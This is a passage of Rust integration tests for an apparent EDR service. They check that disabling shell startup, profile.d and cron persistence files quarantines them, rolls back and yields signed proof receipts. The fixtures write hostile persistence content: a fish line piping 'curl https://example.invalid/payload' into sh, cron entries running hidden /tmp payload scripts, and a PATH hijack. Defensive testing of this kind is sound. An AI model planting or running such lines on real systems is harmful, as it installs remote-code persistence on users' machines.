            payload["execution"]["executionId"]
        );
        assert_eq!(
            proof_payload["execution"]["execution"]["effects"][0]["target"],
            manifest_path.display().to_string()
        );
        assert_eq!(
            proof_payload["requestReceipt"]["receipt"]["metadata"]["endpointDecision"]
                ["receiptFamily"],
            "response_request"
        );
        assert_eq!(
            proof_payload["executionReceipt"]["receipt"]["metadata"]["endpointDecision"]
                ["receiptFamily"],
            "response_execution"
        );
        assert_eq!(
            proof_payload["evidenceBundleReceipt"]["receipt"]["metadata"]["endpointDecision"]
                ["receiptFamily"],
            "evidence_bundle_manifest"
        );
        let transition_receipts = proof_payload["transitionReceipts"]
            .as_array()
            .unwrap_or_else(|| panic!("missing firefox extension proof transition receipts"));
        assert_eq!(transition_receipts.len(), 1);
        assert_eq!(
            transition_receipts[0]["receipt"]["metadata"]["endpointDecision"]["decision"]["title"],
            "Endpoint response action rolled back"
        );
        let rollback_receipts = proof_payload["rollbackReceipts"]
            .as_array()
            .unwrap_or_else(|| panic!("missing firefox extension proof rollback receipts"));
        assert_eq!(rollback_receipts.len(), 1);
        assert_eq!(
            rollback_receipts[0]["receipt"]["metadata"]["endpointDecision"]["receiptFamily"],
            "response_rollback"
        );
        assert!(proof_payload["acknowledgementReceipts"]
            .as_array()
            .unwrap_or_else(|| panic!("missing firefox extension proof acknowledgement receipts"))
            .is_empty());

        let _ = std::fs::remove_dir_all(firefox_root);
        let _ = std::fs::remove_dir_all(quarantine_root.as_ref());
        let _ = std::fs::remove_file(&receipt_path);
        let _ = std::fs::remove_file(endpoint_receipt_index_path(&receipt_path));
    }

    #[tokio::test]
    async fn agent_edr_response_action_disables_shell_startup_persistence_with_rollback_and_proof()
    {
        let receipt_path = test_receipt_path();
        let keypair = Keypair::from_seed(&[91u8; 32]);
        let signer_public_key = keypair.public_key().to_hex();
        let mut state_value = test_state();
        state_value.edr_receipt_ledger = Arc::new(Mutex::new(EndpointReceiptLedger {
            path: Some(receipt_path.clone()),
            next_sequence: 1,
            keypair,
            signer_identity: "test-edr-shell-startup-persistence-signer".to_string(),
            signer_public_key,
        }));
        let state = Arc::new(state_value);
        let quarantine_root = state.edr_quarantine_root.clone();
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .route(
                "/api/v1/agent/edr/response-action",
                post(agent_edr_response_action),
            )
            .route(
                "/api/v1/agent/edr/response-executions/{execution_id}/rollback",
                post(agent_edr_response_execution_rollback),
            )
            .route(
                "/api/v1/agent/edr/response-executions/{execution_id}/proof",
                get(agent_edr_response_execution_proof),
            )
            .with_state(state.clone());
        let counter = TEST_POLICY_COUNTER.fetch_add(1, Ordering::Relaxed);
        let shell_root = std::env::temp_dir().join(format!(
            "clawdstrike-shell-persistence-{}-{counter}",
            std::process::id()
        ));
        let shell_dir = shell_root.join("home/alice/.config/fish/conf.d");
        std::fs::create_dir_all(&shell_dir)
            .unwrap_or_else(|e| panic!("failed to create shell persistence dir: {e}"));
        let source_path = shell_dir.join("evil-agent.fish");
        std::fs::write(
            &source_path,
            b"fish -c 'curl https://example.invalid/payload | sh'\n",
        )
        .unwrap_or_else(|e| panic!("failed to write shell startup file: {e}"));
        let observation = EndpointObservation {
            process: EndpointProcess {
                process_guid: Some("proc-disable-shell-persistence-1".to_string()),
                image: Some("/usr/bin/fish".to_string()),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::FileAccess {
                operation: FileOperation::Write,
                path: source_path.display().to_string(),
                source_url: None,
                content_preview: None,
            },
            ..EndpointObservation::default()
        };
        let body = serde_json::json!({
            "observations": [observation],
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build shell persistence findings request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("shell persistence findings request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);

        let file_node_id = {
            let recorder = state.edr_flight_recorder.lock().await;
            recorder
                .graph()
                .nodes
                .values()
                .find(|node| {
                    node.kind == CausalNodeKind::File
                        && node.label == source_path.display().to_string()
                })
                .map(|node| node.node_id.clone())
                .unwrap_or_else(|| panic!("missing shell persistence file graph node"))
        };
        let body = serde_json::json!({
            "action": "disable_persistence",
            "rootNodeId": file_node_id,
            "ttlSeconds": 600,
            "reason": "disable suspicious shell startup persistence",
            "actor": response_action_actor_input(),
            "dryRun": false
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/response-action")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build shell persistence response request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("shell persistence response request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read shell persistence response: {e}"));
        let payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode shell persistence response: {e}"));

        assert_eq!(payload["execution"]["action"], "disable_persistence");
        assert_eq!(payload["execution"]["status"], "succeeded");
        assert_eq!(
            payload["execution"]["effects"][0]["target"],
            source_path.display().to_string()
        );
        assert!(!source_path.exists());
        let disabled_path = PathBuf::from(
            payload["execution"]["effects"][0]["artifact"]
                .as_str()
                .unwrap_or_else(|| panic!("missing shell persistence artifact path")),
        );
        assert!(disabled_path.is_file());
        assert_eq!(
            std::fs::read(&disabled_path)
                .unwrap_or_else(|e| panic!("failed to read shell persistence artifact: {e}")),
            b"fish -c 'curl https://example.invalid/payload | sh'\n"
        );

        let execution_id = payload["execution"]["executionId"]
            .as_str()
            .unwrap_or_else(|| panic!("missing shell persistence execution id"));
        let body = serde_json::json!({
            "reason": "restore shell startup file"
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri(format!(
                "/api/v1/agent/edr/response-executions/{execution_id}/rollback"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build shell persistence rollback request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("shell persistence rollback request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        assert!(source_path.is_file());
        assert!(!disabled_path.exists());

        let req = axum::http::Request::builder()
            .method("GET")
            .uri(format!(
                "/api/v1/agent/edr/response-executions/{execution_id}/proof"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .body(axum::body::Body::empty())
            .unwrap_or_else(|e| panic!("failed to build shell persistence proof request: {e}"));
        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("shell persistence proof request failed: {e}"));
        let proof_status = response.status();
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read shell persistence proof response: {e}"));
        assert_eq!(
            proof_status,
            StatusCode::OK,
            "unexpected shell persistence proof response: {}",
            String::from_utf8_lossy(&bytes)
        );
        let proof_payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode shell persistence proof response: {e}"));
        assert_eq!(
            proof_payload["execution"]["execution"]["executionId"],
            payload["execution"]["executionId"]
        );
        assert_eq!(
            proof_payload["execution"]["execution"]["effects"][0]["target"],
            source_path.display().to_string()
        );
        assert_eq!(
            proof_payload["requestReceipt"]["receipt"]["metadata"]["endpointDecision"]
                ["receiptFamily"],
            "response_request"
        );
        assert_eq!(
            proof_payload["executionReceipt"]["receipt"]["metadata"]["endpointDecision"]
                ["receiptFamily"],
            "response_execution"
        );
        let transition_receipts = proof_payload["transitionReceipts"]
            .as_array()
            .unwrap_or_else(|| panic!("missing shell persistence proof transition receipts"));
        assert_eq!(transition_receipts.len(), 1);
        assert_eq!(
            transition_receipts[0]["receipt"]["metadata"]["endpointDecision"]["decision"]["title"],
            "Endpoint response action rolled back"
        );
        let rollback_receipts = proof_payload["rollbackReceipts"]
            .as_array()
            .unwrap_or_else(|| panic!("missing shell persistence proof rollback receipts"));
        assert_eq!(rollback_receipts.len(), 1);
        assert_eq!(
            rollback_receipts[0]["receipt"]["metadata"]["endpointDecision"]["receiptFamily"],
            "response_rollback"
        );

        let _ = std::fs::remove_file(source_path);
        let _ = std::fs::remove_dir_all(shell_root);
        let _ = std::fs::remove_dir_all(quarantine_root.as_ref());
        let _ = std::fs::remove_file(&receipt_path);
        let _ = std::fs::remove_file(endpoint_receipt_index_path(&receipt_path));
    }

    #[tokio::test]
    async fn agent_edr_response_action_disables_profile_d_persistence_with_rollback_and_proof() {
        let receipt_path = test_receipt_path();
        let keypair = Keypair::from_seed(&[89u8; 32]);
        let signer_public_key = keypair.public_key().to_hex();
        let mut state_value = test_state();
        state_value.edr_receipt_ledger = Arc::new(Mutex::new(EndpointReceiptLedger {
            path: Some(receipt_path.clone()),
            next_sequence: 1,
            keypair,
            signer_identity: "test-edr-profile-d-persistence-signer".to_string(),
            signer_public_key,
        }));
        let state = Arc::new(state_value);
        let quarantine_root = state.edr_quarantine_root.clone();
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .route(
                "/api/v1/agent/edr/response-action",
                post(agent_edr_response_action),
            )
            .route(
                "/api/v1/agent/edr/response-executions/{execution_id}/rollback",
                post(agent_edr_response_execution_rollback),
            )
            .route(
                "/api/v1/agent/edr/response-executions/{execution_id}/proof",
                get(agent_edr_response_execution_proof),
            )
            .with_state(state.clone());
        let counter = TEST_POLICY_COUNTER.fetch_add(1, Ordering::Relaxed);
        let profile_dir = std::env::temp_dir().join(format!(
            "clawdstrike-profile-d-persistence-{}-{counter}/etc/profile.d",
            std::process::id()
        ));
        std::fs::create_dir_all(&profile_dir)
            .unwrap_or_else(|e| panic!("failed to create profile.d persistence dir: {e}"));
        let source_path = profile_dir.join("evil-agent.sh");
        let profile_script = b"export PATH=/tmp/.evil-agent:$PATH\n";
        std::fs::write(&source_path, profile_script)
            .unwrap_or_else(|e| panic!("failed to write profile.d persistence file: {e}"));
        let observation = EndpointObservation {
            process: EndpointProcess {
                process_guid: Some("proc-disable-profile-d-persistence-1".to_string()),
                image: Some("/bin/sh".to_string()),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::FileAccess {
                operation: FileOperation::Write,
                path: source_path.display().to_string(),
                source_url: None,
                content_preview: None,
            },
            ..EndpointObservation::default()
        };
        let body = serde_json::json!({
            "observations": [observation],
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| {
                panic!("failed to build profile.d persistence findings request: {e}")
            });
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("profile.d persistence findings request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);

        let file_node_id = {
            let recorder = state.edr_flight_recorder.lock().await;
            recorder
                .graph()
                .nodes
                .values()
                .find(|node| {
                    node.kind == CausalNodeKind::File
                        && node.label == source_path.display().to_string()
                })
                .map(|node| node.node_id.clone())
                .unwrap_or_else(|| panic!("missing profile.d persistence file graph node"))
        };
        let body = serde_json::json!({
            "action": "disable_persistence",
            "rootNodeId": file_node_id,
            "ttlSeconds": 600,
            "reason": "disable suspicious profile.d persistence",
            "actor": response_action_actor_input(),
            "dryRun": false
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/response-action")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| {
                panic!("failed to build profile.d persistence response request: {e}")
            });
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("profile.d persistence response request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read profile.d persistence response: {e}"));
        let payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode profile.d persistence response: {e}"));

        assert_eq!(payload["execution"]["action"], "disable_persistence");
        assert_eq!(payload["execution"]["status"], "succeeded");
        assert_eq!(
            payload["execution"]["effects"][0]["target"],
            source_path.display().to_string()
        );
        assert!(!source_path.exists());
        let disabled_path = PathBuf::from(
            payload["execution"]["effects"][0]["artifact"]
                .as_str()
                .unwrap_or_else(|| panic!("missing profile.d persistence artifact path")),
        );
        assert!(disabled_path.is_file());
        assert_eq!(
            std::fs::read(&disabled_path)
                .unwrap_or_else(|e| panic!("failed to read profile.d persistence artifact: {e}")),
            profile_script
        );

        let execution_id = payload["execution"]["executionId"]
            .as_str()
            .unwrap_or_else(|| panic!("missing profile.d persistence execution id"));
        let body = serde_json::json!({
            "reason": "restore profile.d persistence file"
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri(format!(
                "/api/v1/agent/edr/response-executions/{execution_id}/rollback"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| {
                panic!("failed to build profile.d persistence rollback request: {e}")
            });
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("profile.d persistence rollback request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        assert!(source_path.is_file());
        assert!(!disabled_path.exists());

        let req = axum::http::Request::builder()
            .method("GET")
            .uri(format!(
                "/api/v1/agent/edr/response-executions/{execution_id}/proof"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .body(axum::body::Body::empty())
            .unwrap_or_else(|e| panic!("failed to build profile.d proof request: {e}"));
        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("profile.d proof request failed: {e}"));
        let proof_status = response.status();
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read profile.d proof response: {e}"));
        assert_eq!(
            proof_status,
            StatusCode::OK,
            "unexpected profile.d proof response: {}",
            String::from_utf8_lossy(&bytes)
        );
        let proof_payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode profile.d proof response: {e}"));
        assert_eq!(
            proof_payload["execution"]["execution"]["executionId"],
            payload["execution"]["executionId"]
        );
        assert_eq!(
            proof_payload["requestReceipt"]["receipt"]["metadata"]["endpointDecision"]
                ["receiptFamily"],
            "response_request"
        );
        assert_eq!(
            proof_payload["executionReceipt"]["receipt"]["metadata"]["endpointDecision"]
                ["receiptFamily"],
            "response_execution"
        );
        let transition_receipts = proof_payload["transitionReceipts"]
            .as_array()
            .unwrap_or_else(|| panic!("missing profile.d proof transition receipts"));
        assert_eq!(transition_receipts.len(), 1);
        assert_eq!(
            transition_receipts[0]["receipt"]["metadata"]["endpointDecision"]["decision"]["title"],
            "Endpoint response action rolled back"
        );
        let rollback_receipts = proof_payload["rollbackReceipts"]
            .as_array()
            .unwrap_or_else(|| panic!("missing profile.d proof rollback receipts"));
        assert_eq!(rollback_receipts.len(), 1);
        assert_eq!(
            rollback_receipts[0]["receipt"]["metadata"]["endpointDecision"]["receiptFamily"],
            "response_rollback"
        );

        let _ = std::fs::remove_file(source_path);
        let _ = std::fs::remove_dir_all(profile_dir);
        let _ = std::fs::remove_dir_all(quarantine_root.as_ref());
        let _ = std::fs::remove_file(&receipt_path);
        let _ = std::fs::remove_file(endpoint_receipt_index_path(&receipt_path));
    }

    #[tokio::test]
    async fn agent_edr_response_action_disables_cron_persistence_with_rollback_and_proof() {
        let receipt_path = test_receipt_path();
        let keypair = Keypair::from_seed(&[92u8; 32]);
        let signer_public_key = keypair.public_key().to_hex();
        let mut state_value = test_state();
        state_value.edr_receipt_ledger = Arc::new(Mutex::new(EndpointReceiptLedger {
            path: Some(receipt_path.clone()),
            next_sequence: 1,
            keypair,
            signer_identity: "test-edr-cron-persistence-signer".to_string(),
            signer_public_key,
        }));
        let state = Arc::new(state_value);
        let quarantine_root = state.edr_quarantine_root.clone();
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .route(
                "/api/v1/agent/edr/response-action",
                post(agent_edr_response_action),
            )
            .route(
                "/api/v1/agent/edr/response-executions/{execution_id}/rollback",
                post(agent_edr_response_execution_rollback),
            )
            .route(
                "/api/v1/agent/edr/response-executions/{execution_id}/proof",
                get(agent_edr_response_execution_proof),
            )
            .with_state(state.clone());
        let counter = TEST_POLICY_COUNTER.fetch_add(1, Ordering::Relaxed);
        let cron_dir = std::env::temp_dir().join(format!(
            "clawdstrike-cron-persistence-{}-{counter}/var/spool/cron/crontabs",
            std::process::id()
        ));
        std::fs::create_dir_all(&cron_dir)
            .unwrap_or_else(|e| panic!("failed to create cron persistence dir: {e}"));
        let source_path = cron_dir.join("alice");
        std::fs::write(
            &source_path,
            b"*/5 * * * * /usr/bin/python3 /tmp/.cache/payload.py\n",
        )
        .unwrap_or_else(|e| panic!("failed to write cron persistence file: {e}"));
        let observation = EndpointObservation {
            process: EndpointProcess {
                process_guid: Some("proc-disable-cron-persistence-1".to_string()),
                image: Some("/usr/bin/crontab".to_string()),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::FileAccess {
                operation: FileOperation::Write,
                path: source_path.display().to_string(),
                source_url: None,
                content_preview: None,
            },
            ..EndpointObservation::default()
        };
        let body = serde_json::json!({
            "observations": [observation],
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build cron persistence findings request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("cron persistence findings request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);

        let file_node_id = {
            let recorder = state.edr_flight_recorder.lock().await;
            recorder
                .graph()
                .nodes
                .values()
                .find(|node| {
                    node.kind == CausalNodeKind::File
                        && node.label == source_path.display().to_string()
                })
                .map(|node| node.node_id.clone())
                .unwrap_or_else(|| panic!("missing cron persistence file graph node"))
        };
        let body = serde_json::json!({
            "action": "disable_persistence",
            "rootNodeId": file_node_id,
            "ttlSeconds": 600,
            "reason": "disable suspicious cron persistence",
            "actor": response_action_actor_input(),
            "dryRun": false
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/response-action")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build cron persistence response request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("cron persistence response request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read cron persistence response: {e}"));
        let payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode cron persistence response: {e}"));

        assert_eq!(payload["execution"]["action"], "disable_persistence");
        assert_eq!(payload["execution"]["status"], "succeeded");
        assert_eq!(
            payload["execution"]["effects"][0]["target"],
            source_path.display().to_string()
        );
        assert!(!source_path.exists());
        let disabled_path = PathBuf::from(
            payload["execution"]["effects"][0]["artifact"]
                .as_str()
                .unwrap_or_else(|| panic!("missing cron persistence artifact path")),
        );
        assert!(disabled_path.is_file());
        assert_eq!(
            std::fs::read(&disabled_path)
                .unwrap_or_else(|e| panic!("failed to read cron persistence artifact: {e}")),
            b"*/5 * * * * /usr/bin/python3 /tmp/.cache/payload.py\n"
        );

        let execution_id = payload["execution"]["executionId"]
            .as_str()
            .unwrap_or_else(|| panic!("missing cron persistence execution id"));
        let body = serde_json::json!({
            "reason": "restore cron persistence file"
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri(format!(
                "/api/v1/agent/edr/response-executions/{execution_id}/rollback"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build cron persistence rollback request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("cron persistence rollback request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        assert!(source_path.is_file());
        assert!(!disabled_path.exists());

        let req = axum::http::Request::builder()
            .method("GET")
            .uri(format!(
                "/api/v1/agent/edr/response-executions/{execution_id}/proof"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .body(axum::body::Body::empty())
            .unwrap_or_else(|e| panic!("failed to build cron persistence proof request: {e}"));
        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("cron persistence proof request failed: {e}"));
        let proof_status = response.status();
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read cron persistence proof response: {e}"));
        assert_eq!(
            proof_status,
            StatusCode::OK,
            "unexpected cron persistence proof response: {}",
            String::from_utf8_lossy(&bytes)
        );
        let proof_payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode cron persistence proof response: {e}"));
        assert_eq!(
            proof_payload["execution"]["execution"]["executionId"],
            payload["execution"]["executionId"]
        );
        assert_eq!(
            proof_payload["execution"]["execution"]["effects"][0]["target"],
            source_path.display().to_string()
        );
        assert_eq!(
            proof_payload["requestReceipt"]["receipt"]["metadata"]["endpointDecision"]
                ["receiptFamily"],
            "response_request"
        );
        assert_eq!(
            proof_payload["executionReceipt"]["receipt"]["metadata"]["endpointDecision"]
                ["receiptFamily"],
            "response_execution"
        );
        let transition_receipts = proof_payload["transitionReceipts"]
            .as_array()
            .unwrap_or_else(|| panic!("missing cron persistence proof transition receipts"));
        assert_eq!(transition_receipts.len(), 1);
        assert_eq!(
            transition_receipts[0]["receipt"]["metadata"]["endpointDecision"]["decision"]["title"],
            "Endpoint response action rolled back"
        );
        let rollback_receipts = proof_payload["rollbackReceipts"]
            .as_array()
            .unwrap_or_else(|| panic!("missing cron persistence proof rollback receipts"));
        assert_eq!(rollback_receipts.len(), 1);
        assert_eq!(
            rollback_receipts[0]["receipt"]["metadata"]["endpointDecision"]["receiptFamily"],
            "response_rollback"
        );
        assert!(proof_payload["acknowledgementReceipts"]
            .as_array()
            .unwrap_or_else(|| panic!("missing cron persistence proof acknowledgement receipts"))
            .is_empty());

        let _ = std::fs::remove_file(source_path);
        let _ = std::fs::remove_dir_all(cron_dir);
        let _ = std::fs::remove_dir_all(quarantine_root.as_ref());
        let _ = std::fs::remove_file(&receipt_path);
        let _ = std::fs::remove_file(endpoint_receipt_index_path(&receipt_path));
    }

    #[tokio::test]
    async fn agent_edr_response_action_disables_system_cron_dropin_with_rollback_and_proof() {
        let receipt_path = test_receipt_path();
        let keypair = Keypair::from_seed(&[93u8; 32]);
        let signer_public_key = keypair.public_key().to_hex();
        let mut state_value = test_state();
        state_value.edr_receipt_ledger = Arc::new(Mutex::new(EndpointReceiptLedger {
            path: Some(receipt_path.clone()),
            next_sequence: 1,
            keypair,
            signer_identity: "test-edr-system-cron-dropin-persistence-signer".to_string(),
            signer_public_key,
        }));
        let state = Arc::new(state_value);
        let quarantine_root = state.edr_quarantine_root.clone();
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .route(
                "/api/v1/agent/edr/response-action",
                post(agent_edr_response_action),
            )
            .route(
                "/api/v1/agent/edr/response-executions/{execution_id}/rollback",
                post(agent_edr_response_execution_rollback),
            )
            .route(
                "/api/v1/agent/edr/response-executions/{execution_id}/proof",
                get(agent_edr_response_execution_proof),
            )
            .with_state(state.clone());
        let counter = TEST_POLICY_COUNTER.fetch_add(1, Ordering::Relaxed);
        let cron_dir = std::env::temp_dir().join(format!(
            "clawdstrike-cron-dropin-persistence-{}-{counter}/etc/cron.d",
            std::process::id()
        ));
        std::fs::create_dir_all(&cron_dir)
            .unwrap_or_else(|e| panic!("failed to create cron drop-in dir: {e}"));
        let source_path = cron_dir.join("evil-agent");
        std::fs::write(
            &source_path,
            b"*/2 * * * * alice /usr/bin/python3 /tmp/.cache/evil-agent.py\n",
        )
        .unwrap_or_else(|e| panic!("failed to write cron drop-in file: {e}"));
        let observation = EndpointObservation {
            process: EndpointProcess {
                process_guid: Some("proc-disable-system-cron-dropin-1".to_string()),
                image: Some("/usr/bin/crontab".to_string()),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::FileAccess {
                operation: FileOperation::Write,
                path: source_path.display().to_string(),
                source_url: None,
                content_preview: None,
            },
            ..EndpointObservation::default()
        };
        let body = serde_json::json!({
            "observations": [observation],
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build cron drop-in findings request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("cron drop-in findings request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);

        let file_node_id = {
            let recorder = state.edr_flight_recorder.lock().await;
            recorder
                .graph()
                .nodes
                .values()
                .find(|node| {
                    node.kind == CausalNodeKind::File
                        && node.label == source_path.display().to_string()
                })
                .map(|node| node.node_id.clone())
                .unwrap_or_else(|| panic!("missing cron drop-in file graph node"))
        };
        let body = serde_json::json!({
            "action": "disable_persistence",
            "rootNodeId": file_node_id,
            "ttlSeconds": 600,
            "reason": "disable suspicious system cron drop-in",
            "actor": response_action_actor_input(),
            "dryRun": false
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/response-action")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build cron drop-in response request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("cron drop-in response request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read cron drop-in response: {e}"));
        let payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode cron drop-in response: {e}"));

        assert_eq!(payload["execution"]["action"], "disable_persistence");
        assert_eq!(payload["execution"]["status"], "succeeded");
        assert_eq!(
            payload["execution"]["effects"][0]["target"],
            source_path.display().to_string()
        );
        assert!(!source_path.exists());
        let disabled_path = PathBuf::from(
            payload["execution"]["effects"][0]["artifact"]
                .as_str()
                .unwrap_or_else(|| panic!("missing cron drop-in artifact path")),
        );
        assert!(disabled_path.is_file());
        assert_eq!(
            std::fs::read(&disabled_path)
                .unwrap_or_else(|e| panic!("failed to read cron drop-in artifact: {e}")),
            b"*/2 * * * * alice /usr/bin/python3 /tmp/.cache/evil-agent.py\n"
        );

        let execution_id = payload["execution"]["executionId"]
            .as_str()
            .unwrap_or_else(|| panic!("missing cron drop-in execution id"));
        let body = serde_json::json!({
            "reason": "restore system cron drop-in"
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri(format!(
                "/api/v1/agent/edr/response-executions/{execution_id}/rollback"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build cron drop-in rollback request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("cron drop-in rollback request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        assert!(source_path.is_file());
        assert!(!disabled_path.exists());

        let req = axum::http::Request::builder()
            .method("GET")
            .uri(format!(
                "/api/v1/agent/edr/response-executions/{execution_id}/proof"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .body(axum::body::Body::empty())
            .unwrap_or_else(|e| panic!("failed to build cron drop-in proof request: {e}"));
        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("cron drop-in proof request failed: {e}"));
        let proof_status = response.status();
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read cron drop-in proof response: {e}"));
        assert_eq!(
            proof_status,
            StatusCode::OK,
            "unexpected cron drop-in proof response: {}",
            String::from_utf8_lossy(&bytes)
        );
        let proof_payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode cron drop-in proof response: {e}"));
        assert_eq!(
            proof_payload["execution"]["execution"]["executionId"],
            payload["execution"]["executionId"]
        );
        assert_eq!(
            proof_payload["execution"]["execution"]["effects"][0]["target"],
            source_path.display().to_string()
        );
        assert_eq!(
            proof_payload["requestReceipt"]["receipt"]["metadata"]["endpointDecision"]
                ["receiptFamily"],
            "response_request"
        );
        assert_eq!(
